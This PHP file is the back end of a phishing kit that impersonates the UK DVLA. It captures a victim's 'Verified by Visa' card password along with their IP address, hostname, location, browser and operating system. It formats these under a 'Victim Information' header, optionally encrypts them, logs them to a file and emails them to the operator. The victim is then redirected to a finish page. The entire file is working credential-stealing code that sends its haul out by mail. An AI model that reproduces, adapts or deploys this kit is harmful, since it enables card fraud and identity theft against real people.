<?php
/*

*/
require "session_protect.php";
require "functions.php";
require "../../CONTROLS.php";
date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$vbv = $_POST["vbv"];
$ip = $_SERVER['REMOTE_ADDR'];
$VictimInfo1 = "Submitted by: " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "UserAgent: " . $systemInfo['useragent'] . "";
$VictimInfo4 = "Browser: " . $systemInfo['browser'] . "";
$VictimInfo5 = "Os: " . $systemInfo['os'] . "";
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$category = ($cardInfo['card_category']);
$from = $From_Address;
$headers = "From:" . $from;
$subj = "vbv : $ip";
$to = $Your_Email; 
$data = "
+ ------------- DVLA VBV -------------+
+ ------------------------------------------+
+ VBV
| Pass : $vbv
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";
if($Encrypt==1) {
	require "AES.php";
	$imputText = $data;
	$imputKey = $Key;
	$blockSize = 256;
	$aes = new AES($imputText, $imputKey, $blockSize);
	$enc = $aes->encrypt();
	$aes->setData($enc);
	$dec=$aes->decrypt();
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("../logs/cap-vbv.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("../logs/cap-vbv.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}	
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
header("Location: ../../Finish.php");
die();
?>